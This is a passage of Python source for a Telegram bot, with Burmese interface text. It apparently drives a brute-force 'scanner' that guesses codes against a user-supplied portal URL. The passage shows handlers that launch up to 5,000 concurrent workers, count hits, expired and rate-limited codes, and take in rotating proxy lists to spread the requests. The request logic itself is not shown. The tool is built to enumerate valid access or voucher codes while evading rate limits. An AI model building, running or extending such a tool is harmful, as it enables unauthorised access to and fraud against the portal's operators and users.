                f"ဂဏန်းတစ်လုံးသာ ပြန်ပို့ပေးပါ။",
                parse_mode=ParseMode.MARKDOWN,
            )
            return

        pm = get_proxy_manager()
        proxy_total, proxy_active, proxy_in_use = pm.stats()
        await query.message.edit_text(
            f"{XIZO_LOGO}\n"
            f"▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬\n"
            f"🎲 Mode     ›  `{ud['mode']}`\n"
            f"🌐 Proxies  ›  `{proxy_active}/{proxy_total}`\n\n"
            f"▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬\n"
            f"👇 Menu မှ ရွေးပါ",
            reply_markup=get_main_menu_markup(),
            parse_mode=ParseMode.MARKDOWN,
        )

    elif data == "btn_back_main":
        pm = get_proxy_manager()
        proxy_total, proxy_active, proxy_in_use = pm.stats()
        await query.message.edit_text(
            f"{XIZO_LOGO}\n"
            f"▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬\n"
            f"🎲 Mode     ›  `{ud['mode']}`\n"
            f"🌐 Proxies  ›  `{proxy_active}/{proxy_total}`\n\n"
            f"▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬\n"
            f"👇 Menu မှ ရွေးပါ",
            reply_markup=get_main_menu_markup(),
            parse_mode=ParseMode.MARKDOWN,
        )

    elif data == "btn_add_proxies":
        ud["state"] = "waiting_for_proxy_text"
        ud["menu_msg_id"] = query.message.message_id
        await query.message.edit_text(
            f"{XIZO_MINI}\n"
            f"📥 𝐏𝐑𝐎𝐗𝐘 𝐈𝐍𝐏𝐔𝐓\n"
            f"▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬\n"
            f"Proxy များကို ယခုပို့ပါ -\n"
            f"▸ စာသား (Text)\n"
            f"▸ `.txt` ဖိုင်\n\n"
            f"📌 ဥပမာ:\n"
            f"`123.45.67.89:8080`\n"
            f"`socks5://user:pass@host:1080`\n\n"
            f"🤖 ထပ်နေသော Proxy များ အလိုအလျောက် ဖယ်ရှားပါမည်။",
            parse_mode=ParseMode.MARKDOWN,
        )

    elif data == "btn_start_scanner":
        if not ud["portal_url"]:
            await query.message.edit_text(
                f"{XIZO_MINI}\n"
                f"❌ 𝐏𝐎𝐑𝐓𝐀𝐋 𝐔𝐑𝐋 𝐍𝐎𝐓 𝐅𝐎𝐔𝐍𝐃\n"
                f"▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬\n"
                f"Update Portal ကို အရင်လုပ်ပါ။",
                parse_mode=ParseMode.MARKDOWN,
            )
            return

        if ud["task"] and not ud["task"].done():
            ud["stop_event"].set()
            ud["dash_update_event"].set()
            try:
                await asyncio.wait_for(ud["task"], timeout=10.0)
            except (asyncio.TimeoutError, asyncio.CancelledError):
                ud["task"].cancel()
                try:
                    await ud["task"]
                except:
                    pass

        ud["stop_event"].clear()
        ud["stats"] = {
            "tried": 0,
            "hits": 0,
            "expired": 0,
            "limits": 0,
            "start_time": time.time(),
        }
        ud["valid_codes"] = []
        ud["limit_codes"] = []
        ud["tried_codes"] = set()
        ud["recent_logs"] = []
        ud["CURRENT_CODE"] = "----"

        await query.message.edit_text(
            "🔄 **𝐈𝐧𝐢𝐭𝐢𝐚𝐥𝐢𝐳𝐢𝐧𝐠...**", parse_mode=ParseMode.MARKDOWN
        )
        ud["dash_msg_id"] = query.message.message_id
        asyncio.create_task(run_user_scanner(context, user_id))

    elif data in ["add_100", "sub_100", "add_500", "sub_500"]:
        if not ud.get("task") or ud["task"].done() or not ud.get("scan_config"):
            return

        count = 100 if "100" in data else 500

        if data.startswith("add"):
            if len(ud["worker_tasks"]) + count > 5000:
                count = max(0, 5000 - len(ud["worker_tasks"]))

            for _ in range(count):
                task = asyncio.create_task(
                    worker(random.randint(10000, 99999), **ud["scan_config"], user_id=user_id)
                )
                ud["worker_tasks"].append(task)

        elif data.startswith("sub"):
            for _ in range(min(count, len(ud["worker_tasks"]))):
                task = ud["worker_tasks"].pop()
                if not task.done():
                    task.cancel()

        ud["dash_update_event"].set()

    elif data == "stop_scan":
        ud["stop_event"].set()
        ud["dash_update_event"].set()
        if ud["task"] and not ud["task"].done():
            ud["task"].cancel()


@admin_only
async def handle_text(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    ud = get_user_data(user_id)
    state = ud.get("state")
    text = update.message.text.strip()

    if state == "waiting_for_portal_url":
        if not text.startswith("http"):
            await update.message.reply_text(
                "❌ `http://` သို့မဟုတ် `https://` URL ပို့ပါ။",
                parse_mode=ParseMode.MARKDOWN,
            )
            return
        ud["portal_url"] = text
        ud["state"] = None
        pm = get_proxy_manager()
        proxy_total, proxy_active, proxy_in_use = pm.stats()
        msg = await update.message.reply_text(
            f"{XIZO_LOGO}\n"
            f"✅ 𝐏𝐎𝐑𝐓𝐀𝐋 𝐔𝐑𝐋 𝐒𝐀𝐕𝐄𝐃\n"
            f"▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬\n"
            f"🎲 Mode     ›  `{ud['mode']}`\n"
            f"🌐 Proxies  ›  `{proxy_active}/{proxy_total}`",
            reply_markup=get_main_menu_markup(),
            parse_mode=ParseMode.MARKDOWN,
        )
        ud["menu_msg_id"] = msg.message_id

    elif state == "waiting_for_digit":
        if text in ud["char_set"] and len(text) == 1:
            ud["start_digit"] = text
        else:
            ud["start_digit"] = "0"
        ud["state"] = None
        pm = get_proxy_manager()
        proxy_total, proxy_active, proxy_in_use = pm.stats()
        msg = await update.message.reply_text(
            f"{XIZO_LOGO}\n"
            f"✅ 𝐒𝐓𝐀𝐑𝐓 𝐃𝐈𝐆𝐈𝐓 𝐒𝐄𝐓\n"
            f"▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬\n"
            f"🎯 Digit    ›  `{ud['start_digit']}`\n"
            f"🎲 Mode     ›  `{ud['mode']}`\n"
            f"🌐 Proxies  ›  `{proxy_active}/{proxy_total}`",
            reply_markup=get_main_menu_markup(),
            parse_mode=ParseMode.MARKDOWN,
        )
        ud["menu_msg_id"] = msg.message_id

    elif state == "waiting_for_proxy_text":
        lines = [line.strip() for line in text.splitlines() if line.strip()]
        if not lines:
            await update.message.reply_text(
                "❌ Proxy list ဗလာဖြစ်နေသည်။", parse_mode=ParseMode.MARKDOWN
            )
            return

        await process_and_save_proxies(update, lines, user_id)


@admin_only
async def handle_document(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    ud = get_user_data(user_id)

    if ud.get("state") != "waiting_for_proxy_text":
        return

    document = update.message.document
    if not document.file_name.endswith(".txt"):
        await update.message.reply_text(
            "❌ `.txt` ဖိုင်ကိုသာ ပို့ပါ။", parse_mode=ParseMode.MARKDOWN
        )
        return

    try:
        file = await context.bot.get_file(document.file_id)
        file_bytes = await file.download_as_bytearray()
        text = file_bytes.decode('utf-8')
    except UnicodeDecodeError:
        text = file_bytes.decode('latin-1')
    except Exception as e:
        await update.message.reply_text(
            f"❌ ဖိုင်ဖတ်ရာတွင် အမှား ➜ {e}", parse_mode=ParseMode.MARKDOWN
        )
        return

    lines = [line.strip() for line in text.splitlines() if line.strip()]
    if not lines:
        await update.message.reply_text(
            "❌ ဖိုင်ထဲတွင် Proxy မပါဝင်ပါ။", parse_mode=ParseMode.MARKDOWN
        )
        return

    await process_and_save_proxies(update, lines, user_id)


# ---------------- MAIN ----------------
def main():
    pm = get_proxy_manager()
    total, active, in_use = pm.stats()
    print(f"[MAIN] Proxy Manager initialized: {active}/{total} active proxies")

    if total > 0:
        print("[MAIN] Starting initial latency test...")
        asyncio.get_event_loop().create_task(pm.test_all_proxies())

    app = Application.builder().token(BOT_TOKEN).build()

    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("addproxies", add_proxies_cmd))
    app.add_handler(CallbackQueryHandler(handle_callbacks))
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_text))
    app.add_handler(MessageHandler(filters.Document.ALL, handle_document))

    print("Bot is running with python-telegram-bot...")
    app.run_polling()


if __name__ == "__main__":
    try:
        main()
    except (KeyboardInterrupt, SystemExit):
        pass